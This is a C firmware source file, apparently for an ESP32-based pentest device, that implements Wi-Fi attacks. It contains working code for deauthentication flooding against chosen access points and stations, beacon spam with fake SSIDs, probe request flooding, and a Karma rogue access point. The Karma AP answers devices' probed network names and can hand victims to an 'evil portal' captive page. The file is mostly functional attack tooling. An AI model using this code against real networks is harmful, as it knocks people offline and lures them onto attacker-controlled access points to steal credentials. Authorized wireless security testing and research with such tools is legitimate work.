#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_random.h"
#include "wifi_attack.h"
#include "evil_portal.h"

static const char *TAG = "wifi_attack";

/* ---- Deauth ---- */

typedef struct {
    uint8_t frame_ctrl[2];   /* 0xC0, 0x00 */
    uint8_t duration[2];
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) deauth_frame_t;

static TaskHandle_t deauth_task_handle = NULL;
static volatile bool deauth_running = false;
static uint8_t deauth_target_bssid[6];
static uint8_t deauth_channel = 1;
static uint16_t deauth_reason = 7; /* class3 frame from nonassociated STA */

#define DEAUTH_MULTI_MAX 4

typedef struct {
    uint8_t mode;      /* 0 = AP broadcast, 1 = station target */
    uint8_t channel;
    uint8_t bssid[6];
    uint8_t sta[6];
} deauth_target_t;

static deauth_target_t deauth_targets[DEAUTH_MULTI_MAX];
static uint8_t deauth_target_count = 0;

static void deauth_task(void *arg)
{
    (void)arg;
    deauth_frame_t frame;

    memset(&frame, 0, sizeof(frame));
    frame.frame_ctrl[0] = 0xC0; /* deauth */
    frame.frame_ctrl[1] = 0x00;
    frame.reason_code = deauth_reason;

    /* Broadcast deauth: dest = FF:FF:FF:FF:FF:FF */
    memset(frame.dest, 0xFF, 6);
    memcpy(frame.src, deauth_target_bssid, 6);
    memcpy(frame.bssid, deauth_target_bssid, 6);

    esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);

    ESP_LOGI(TAG, "Deauth started on ch%d, BSSID=%02X:%02X:%02X:%02X:%02X:%02X",
             deauth_channel,
             deauth_target_bssid[0], deauth_target_bssid[1], deauth_target_bssid[2],
             deauth_target_bssid[3], deauth_target_bssid[4], deauth_target_bssid[5]);

    while (deauth_running) {
        frame.seq_ctrl++;
        esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    ESP_LOGI(TAG, "Deauth stopped");
    vTaskDelete(NULL);
}

static void deauth_multi_task(void *arg)
{
    (void)arg;
    deauth_frame_t frame;
    uint16_t seq = 0;

    ESP_LOGI(TAG, "Multi deauth started, targets=%d", deauth_target_count);

    while (deauth_running) {
        for (uint8_t i = 0; i < deauth_target_count && deauth_running; i++) {
            deauth_target_t *t = &deauth_targets[i];

            memset(&frame, 0, sizeof(frame));
            frame.frame_ctrl[0] = 0xC0;
            frame.frame_ctrl[1] = 0x00;
            frame.reason_code = deauth_reason;
            frame.seq_ctrl = ++seq;

            if (t->mode == 1) {
                memcpy(frame.dest, t->sta, 6);
            } else {
                memset(frame.dest, 0xFF, 6);
            }
            memcpy(frame.src, t->bssid, 6);
            memcpy(frame.bssid, t->bssid, 6);

            esp_wifi_set_channel(t->channel, WIFI_SECOND_CHAN_NONE);
            for (uint8_t n = 0; n < 6 && deauth_running; n++) {
                esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
                vTaskDelay(pdMS_TO_TICKS(5));
            }
        }
    }

    ESP_LOGI(TAG, "Multi deauth stopped");
    vTaskDelete(NULL);
}

void deauth_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (deauth_running) {
        resp->status = RESP_BUSY;
        return;
    }

    /* Payload: [0..5] target BSSID, [6] channel, [7..8] reason code (optional) */
    if (cmd->payload_len < 7) {
        resp->status = RESP_ERR;
        return;
    }

    memcpy(deauth_target_bssid, cmd->payload, 6);
    deauth_channel = cmd->payload[6];
    deauth_target_count = 0;
    if (cmd->payload_len >= 9) {
        deauth_reason = cmd->payload[7] | (cmd->payload[8] << 8);
    } else {
        deauth_reason = 7;
    }

    /* Need promiscuous mode for raw frame TX */
    esp_wifi_set_promiscuous(true);

    deauth_running = true;
    xTaskCreate(deauth_task, "deauth", 2048, NULL, 5, &deauth_task_handle);

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void deauth_multi_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (deauth_running) {
        resp->status = RESP_BUSY;
        return;
    }

    if (cmd->payload_len < 1) {
        resp->status = RESP_ERR;
        return;
    }

    uint8_t count = cmd->payload[0];
    if (count == 0 || count > DEAUTH_MULTI_MAX) {
        resp->status = RESP_ERR;
        return;
    }

    if (cmd->payload_len < 1 + count * 14) {
        resp->status = RESP_ERR;
        return;
    }

    memset(deauth_targets, 0, sizeof(deauth_targets));
    for (uint8_t i = 0; i < count; i++) {
        uint8_t off = 1 + i * 14;
        deauth_targets[i].mode = cmd->payload[off] ? 1 : 0;
        deauth_targets[i].channel = cmd->payload[off + 1];
        memcpy(deauth_targets[i].bssid, &cmd->payload[off + 2], 6);
        memcpy(deauth_targets[i].sta, &cmd->payload[off + 8], 6);
    }

    deauth_target_count = count;
    deauth_reason = 7;

    esp_wifi_set_promiscuous(true);
    deauth_running = true;
    xTaskCreate(deauth_multi_task, "deauth_multi", 3072, NULL, 5, &deauth_task_handle);

    resp->status = RESP_OK;
    resp->payload[0] = deauth_target_count;
    resp->payload_len = 1;
}

void deauth_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    deauth_running = false;
    deauth_task_handle = NULL;
    deauth_target_count = 0;
    esp_wifi_set_promiscuous(false);

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

/* ---- Beacon Spam ---- */

/* 802.11 beacon frame template */
static const uint8_t beacon_template[] = {
    /* Frame Control: Beacon */
    0x80, 0x00,
    /* Duration */
    0x00, 0x00,
    /* Destination: broadcast */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    /* Source: will be randomized */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* BSSID: same as source */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* Sequence control */
    0x00, 0x00,
    /* Timestamp (8 bytes) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* Beacon interval: 100 TU */
    0x64, 0x00,
    /* Capability info: ESS */
    0x01, 0x04,
    /* Tagged parameters start here — SSID IE will be appended */
};

#define BEACON_HDR_LEN sizeof(beacon_template)
#define MAX_BEACON_SSIDS 32
#define MAX_SSID_LEN     32
#define BEACON_CHANNEL   6
#define BEACON_BURST     3
#define BEACON_FLAG_SHUFFLE 0x01

static TaskHandle_t beacon_task_handle = NULL;
static volatile bool beacon_running = false;
static char beacon_ssids[MAX_BEACON_SSIDS][MAX_SSID_LEN + 1];
static uint8_t beacon_bssids[MAX_BEACON_SSIDS][6];
static uint8_t beacon_ssid_count = 0;
static bool beacon_shuffle_enabled = true;

static void beacon_make_bssid(uint8_t bssid[6])
{
    esp_fill_random(bssid, 6);
    bssid[0] |= 0x02;
    bssid[0] &= 0xFE;
}

static void beacon_refresh_bssids(void)
{
    for (int i = 0; i < beacon_ssid_count; i++) {
        beacon_make_bssid(beacon_bssids[i]);
    }
}

static void beacon_shuffle(void)
{
    for (int i = beacon_ssid_count - 1; i > 0; i--) {
        uint32_t r;
        esp_fill_random(&r, sizeof(r));
        int j = r % (i + 1);
        char tmp[MAX_SSID_LEN + 1];
        uint8_t tmp_bssid[6];
        memcpy(tmp, beacon_ssids[i], sizeof(tmp));
        memcpy(beacon_ssids[i], beacon_ssids[j], sizeof(tmp));
        memcpy(beacon_ssids[j], tmp, sizeof(tmp));
        memcpy(tmp_bssid, beacon_bssids[i], sizeof(tmp_bssid));
        memcpy(beacon_bssids[i], beacon_bssids[j], sizeof(tmp_bssid));
        memcpy(beacon_bssids[j], tmp_bssid, sizeof(tmp_bssid));
    }
}

static void beacon_task(void *arg)
{
    (void)arg;
    uint8_t frame[128];
    uint16_t seq = 0;

    ESP_LOGI(TAG, "Beacon spam started with %d SSIDs", beacon_ssid_count);
    esp_wifi_set_channel(BEACON_CHANNEL, WIFI_SECOND_CHAN_NONE);

    while (beacon_running) {
        if (beacon_shuffle_enabled) {
            beacon_shuffle();
        }
        for (int i = 0; i < beacon_ssid_count && beacon_running; i++) {
            memcpy(frame, beacon_template, BEACON_HDR_LEN);

            memcpy(&frame[10], beacon_bssids[i], 6);
            memcpy(&frame[16], &frame[10], 6);

            seq++;
            frame[22] = (seq & 0x0F) << 4;
            frame[23] = (seq >> 4) & 0xFF;

            uint8_t ssid_len = (uint8_t)strlen(beacon_ssids[i]);
            size_t pos = BEACON_HDR_LEN;
            frame[pos++] = 0x00;
            frame[pos++] = ssid_len;
            memcpy(&frame[pos], beacon_ssids[i], ssid_len);
            pos += ssid_len;

            frame[pos++] = 0x01;
            frame[pos++] = 0x08;
            frame[pos++] = 0x82; frame[pos++] = 0x84;
            frame[pos++] = 0x8B; frame[pos++] = 0x96;
            frame[pos++] = 0x0C; frame[pos++] = 0x12;
            frame[pos++] = 0x18; frame[pos++] = 0x24;

            frame[pos++] = 0x03;
            frame[pos++] = 0x01;
            frame[pos++] = BEACON_CHANNEL;

            for (int n = 0; n < BEACON_BURST && beacon_running; n++) {
                esp_wifi_80211_tx(WIFI_IF_STA, frame, pos, false);
                vTaskDelay(pdMS_TO_TICKS(8));
            }
        }
    }

    ESP_LOGI(TAG, "Beacon spam stopped");
    vTaskDelete(NULL);
}

/* SSID pool management — load SSIDs in batches before starting beacon */

void ssid_clear(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    beacon_ssid_count = 0;
    memset(beacon_ssids, 0, sizeof(beacon_ssids));
    memset(beacon_bssids, 0, sizeof(beacon_bssids));
    beacon_shuffle_enabled = true;
    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void ssid_add(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    /* Payload: null-separated SSIDs to append to pool */
    const char *p = (const char *)cmd->payload;
    const char *end = p + cmd->payload_len;
    uint8_t added = 0;

    while (p < end && beacon_ssid_count < MAX_BEACON_SSIDS) {
        size_t len = strnlen(p, end - p);
        if (len == 0) { p++; continue; }
        if (len > MAX_SSID_LEN) len = MAX_SSID_LEN;
        memcpy(beacon_ssids[beacon_ssid_count], p, len);
        beacon_ssids[beacon_ssid_count][len] = '\0';
        beacon_make_bssid(beacon_bssids[beacon_ssid_count]);
        beacon_ssid_count++;
        added++;
        p += len + 1;
    }

    resp->status = RESP_OK;
    resp->payload[0] = beacon_ssid_count;
    resp->payload_len = 1;
}

void ssid_get_count(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    resp->status = RESP_OK;
    resp->payload[0] = beacon_ssid_count;
    resp->payload_len = 1;
}

void beacon_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (beacon_running) {
        resp->status = RESP_BUSY;
        return;
    }

    /* If payload provided, parse inline SSIDs (backwards compat).
     * If payload_len == 0, use pre-loaded SSID pool from ssid_add. */
    if (cmd->payload_len > 0) {
        beacon_ssid_count = 0;
        const char *p = (const char *)cmd->payload;
        const char *end = p + cmd->payload_len;

        while (p < end && beacon_ssid_count < MAX_BEACON_SSIDS) {
            size_t len = strnlen(p, end - p);
            if (len == 0) { p++; continue; }
            if (len > MAX_SSID_LEN) len = MAX_SSID_LEN;
            memcpy(beacon_ssids[beacon_ssid_count], p, len);
            beacon_ssids[beacon_ssid_count][len] = '\0';
            beacon_make_bssid(beacon_bssids[beacon_ssid_count]);
            beacon_ssid_count++;
            p += len + 1;
        }
    }

    if (beacon_ssid_count == 0) {
        resp->status = RESP_ERR;
        return;
    }

    beacon_refresh_bssids();
    esp_wifi_set_promiscuous(true);
    beacon_running = true;
    xTaskCreate(beacon_task, "beacon", 3072, NULL, 5, &beacon_task_handle);

    resp->status = RESP_OK;
    resp->payload[0] = beacon_ssid_count;
    resp->payload_len = 1;
}

void beacon_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    beacon_running = false;
    beacon_task_handle = NULL;
    esp_wifi_set_promiscuous(false);

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void beacon_set_flags(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    if (beacon_running || cmd->payload_len < 1) {
        resp->status = RESP_ERR;
        return;
    }

    beacon_shuffle_enabled = (cmd->payload[0] & BEACON_FLAG_SHUFFLE) != 0;
    resp->status = RESP_OK;
    resp->payload_len = 0;
}

/* ---- Probe Request Flood ---- */

static TaskHandle_t probe_task_handle = NULL;
static volatile bool probe_running = false;

static void probe_flood_task(void *arg)
{
    (void)arg;
    uint8_t frame[64];
    uint16_t seq = 0;

    ESP_LOGI(TAG, "Probe flood started");

    while (probe_running) {
        memset(frame, 0, sizeof(frame));
        /* Frame control: probe request */
        frame[0] = 0x40;
        frame[1] = 0x00;
        /* Destination: broadcast */
        memset(&frame[4], 0xFF, 6);
        /* Source: random locally-administered MAC */
        esp_fill_random(&frame[10], 6);
        frame[10] |= 0x02;
        frame[10] &= 0xFE;
        /* BSSID: broadcast */
        memset(&frame[16], 0xFF, 6);
        /* Sequence control */
        seq++;
        frame[22] = (seq & 0x0F) << 4;
        frame[23] = (seq >> 4) & 0xFF;
        /* SSID IE: wildcard (len=0) */
        frame[24] = 0x00;
        frame[25] = 0x00;
        /* Supported rates IE */
        frame[26] = 0x01;
        frame[27] = 0x04;
        frame[28] = 0x82;
        frame[29] = 0x84;
        frame[30] = 0x8B;
        frame[31] = 0x96;

        esp_wifi_80211_tx(WIFI_IF_STA, frame, 32, false);
        vTaskDelay(pdMS_TO_TICKS(5));
    }

    ESP_LOGI(TAG, "Probe flood stopped");
    vTaskDelete(NULL);
}

void probe_flood_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    if (probe_running) {
        resp->status = RESP_BUSY;
        return;
    }

    esp_wifi_set_promiscuous(true);
    probe_running = true;
    xTaskCreate(probe_flood_task, "probe_flood", 2048, NULL, 5, &probe_task_handle);

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void probe_flood_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    probe_running = false;
    probe_task_handle = NULL;
    esp_wifi_set_promiscuous(false);

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

/* ---- Karma AP ---- */

static TaskHandle_t karma_task_handle = NULL;
static volatile bool karma_running = false;
static volatile bool karma_pending = false;
static bool karma_portal_mode = false;
static char karma_pending_ssid[MAX_SSID_LEN + 1];
static char karma_current_ssid[MAX_SSID_LEN + 1];
static char karma_last_ssid[MAX_SSID_LEN + 1];
static uint32_t karma_probe_count = 0;

static void karma_set_ap_ssid(const char *ssid)
{
    wifi_config_t ap_cfg;
    memset(&ap_cfg, 0, sizeof(ap_cfg));

    strncpy((char *)ap_cfg.ap.ssid, ssid, sizeof(ap_cfg.ap.ssid) - 1);
    ap_cfg.ap.ssid_len = strlen(ssid);
    ap_cfg.ap.channel = BEACON_CHANNEL;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;

    esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    if (karma_portal_mode) {
        portal_set_active_ssid(ssid);
    }
    strncpy(karma_current_ssid, ssid, sizeof(karma_current_ssid) - 1);
    karma_current_ssid[sizeof(karma_current_ssid) - 1] = '\0';
}

static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!karma_running || type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    if (len < 26) return;
    if ((frame[0] & 0xFC) != 0x40) return; /* probe request */

    uint16_t pos = 24;
    while (pos + 2 <= len)
    {
        uint8_t tag = frame[pos++];
        uint8_t tag_len = frame[pos++];
        if (pos + tag_len > len) break;

        if (tag == 0x00 && tag_len > 0 && tag_len <= MAX_SSID_LEN)
        {
            memcpy(karma_pending_ssid, &frame[pos], tag_len);
            karma_pending_ssid[tag_len] = '\0';
            memcpy(karma_last_ssid, &frame[pos], tag_len);
            karma_last_ssid[tag_len] = '\0';
            karma_pending = true;
            karma_probe_count++;
            break;
        }
        pos += tag_len;
    }
}

static void karma_task(void *arg)
{
    (void)arg;
    char ssid[MAX_SSID_LEN + 1];

    karma_set_ap_ssid("M1-Karma");
    ESP_LOGI(TAG, "Karma started");

    while (karma_running)
    {
        if (karma_pending)
        {
            karma_pending = false;
            strncpy(ssid, karma_pending_ssid, sizeof(ssid) - 1);
            ssid[sizeof(ssid) - 1] = '\0';
            if (ssid[0] && strcmp(ssid, karma_current_ssid) != 0)
            {
                karma_set_ap_ssid(ssid);
                ESP_LOGI(TAG, "Karma AP now '%s'", ssid);
            }
        }
        vTaskDelay(pdMS_TO_TICKS(250));
    }

    ESP_LOGI(TAG, "Karma stopped, probes=%lu", karma_probe_count);
    vTaskDelete(NULL);
}

void karma_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    if (karma_running) {
        resp->status = RESP_BUSY;
        return;
    }

    karma_probe_count = 0;
    karma_pending = false;
    karma_portal_mode = false;
    memset(karma_pending_ssid, 0, sizeof(karma_pending_ssid));
    memset(karma_current_ssid, 0, sizeof(karma_current_ssid));
    memset(karma_last_ssid, 0, sizeof(karma_last_ssid));

    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_set_channel(BEACON_CHANNEL, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
    esp_wifi_set_promiscuous(true);

    karma_running = true;
    xTaskCreate(karma_task, "karma", 3072, NULL, 5, &karma_task_handle);

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void karma_portal_start(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    if (karma_running) {
        resp->status = RESP_BUSY;
        return;
    }

    karma_probe_count = 0;
    karma_pending = false;
    karma_portal_mode = true;
    memset(karma_pending_ssid, 0, sizeof(karma_pending_ssid));
    memset(karma_current_ssid, 0, sizeof(karma_current_ssid));
    memset(karma_last_ssid, 0, sizeof(karma_last_ssid));

    if (!portal_prepare_ap("M1-Karma", BEACON_CHANNEL) || !portal_services_start(true)) {
        karma_portal_mode = false;
        resp->status = RESP_ERR;
        return;
    }

    esp_wifi_set_channel(BEACON_CHANNEL, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
    esp_wifi_set_promiscuous(true);

    karma_running = true;
    xTaskCreate(karma_task, "karma_portal", 3072, NULL, 5, &karma_task_handle);

    resp->status = RESP_OK;
    resp->payload_len = 0;
}

void karma_stop(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    karma_running = false;
    karma_task_handle = NULL;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (karma_portal_mode) {
        portal_services_stop(false);
        karma_portal_mode = false;
    }
    esp_wifi_set_mode(WIFI_MODE_STA);

    resp->payload[0] = (uint8_t)(karma_probe_count & 0xFF);
    resp->payload[1] = (uint8_t)((karma_probe_count >> 8) & 0xFF);
    resp->payload_len = 2;
    resp->status = RESP_OK;
}

void karma_status(const m1_cmd_t *cmd, m1_resp_t *resp)
{
    (void)cmd;
    const char *ssid = karma_last_ssid[0] ? karma_last_ssid : karma_current_ssid;
    uint8_t slen = (uint8_t)strnlen(ssid, MAX_SSID_LEN);

    resp->payload[0] = karma_running ? 1 : 0;
    resp->payload[1] = (uint8_t)(karma_probe_count & 0xFF);
    resp->payload[2] = (uint8_t)((karma_probe_count >> 8) & 0xFF);
    resp->payload[3] = (uint8_t)((karma_probe_count >> 16) & 0xFF);
    resp->payload[4] = (uint8_t)((karma_probe_count >> 24) & 0xFF);
    resp->payload[5] = slen;
    if (slen > 0) {
        memcpy(&resp->payload[6], ssid, slen);
    }
    resp->payload_len = 6 + slen;
    resp->status = RESP_OK;
}

void wifi_attack_init(void)
{
    /* Nothing to init — promiscuous mode enabled on demand */
}
